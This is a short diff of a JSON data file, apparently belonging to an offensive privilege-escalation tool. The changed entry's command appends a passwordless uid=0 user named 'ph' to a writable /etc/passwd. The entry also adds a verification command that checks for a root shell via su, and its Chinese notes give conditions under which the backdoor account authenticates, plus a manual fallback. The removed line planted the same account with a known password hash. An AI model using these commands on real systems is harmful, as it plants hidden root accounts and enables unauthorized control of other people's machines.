@@ -26,8 +26,10 @@
     "risk": "低",
     "reliability": 90,
     "match": "(?m)^/etc/passwd$",
-    "cmd": "echo 'ph:$1$ph$3dt7r96JohSjP82/io0fP1:0:0:root:/root:/bin/bash' >> /etc/passwd",
-    "note": "追加 uid=0 用户 ph（密码 pivothub）后 su ph 即可 root；改密码用 openssl passwd -1 -salt ph <新密码> 替换哈希。"
+    "cmd": "echo 'ph::0:0:root:/root:/bin/bash' >> /etc/passwd",
+    "verify": "script -qc \"su ph -c 'id'\" /dev/null </dev/null 2>&1",
+    "expect": "uid=0\\(root\\)",
+    "note": "追加 uid=0 用户 ph 后以 root 执行命令。注意：① 空密码（passwd 字段留空）在 shadow 不可写 + shadow:compat 的机器上才认证通过，写哈希会 su 失败；② 无 script 时可用已有的交互 TTY 会话手工 su ph。"
   },
   {
     "id": "linux-docker-group",
